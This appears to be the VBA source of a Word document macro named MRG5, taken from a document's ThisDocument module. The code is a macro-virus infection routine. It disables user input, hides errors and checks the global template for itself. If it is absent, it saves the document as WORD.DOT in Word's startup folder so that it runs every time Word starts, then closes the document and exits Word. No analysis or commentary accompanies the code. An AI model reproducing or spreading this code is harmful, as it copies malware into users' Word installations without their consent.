   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "MRG5"

   Public Sub MAIN()
   Dim A
   Dim B
   Dim s$
   Dim cm
   Dim i
   Dim t
   WordBasic.DisableInput 1
   On Error Resume Next
   Err.Number = 0
   A = 1
   B = 0.5
   s$ = WordBasic.[DefaultDir$](8) + "\WORD.DOT"
       'check

   cm = WordBasic.CountMacros(0, 0, 1)
   If cm > 0 Then
     For i = 1 To cm
   If WordBasic.[MacroName$](i, 0, 0, 1) = "MRG5" Then t = 1
       Next i
   End If
   If t <> 1 Then
   WordBasic.FileSaveAs Name:=s$, Format:=B * 2 / A
   On Error Resume Next
   Err.Number = 0
   WordBasic.DocClose 1
   WordBasic.FileExit 1
   End If

   exit_:


   End Sub
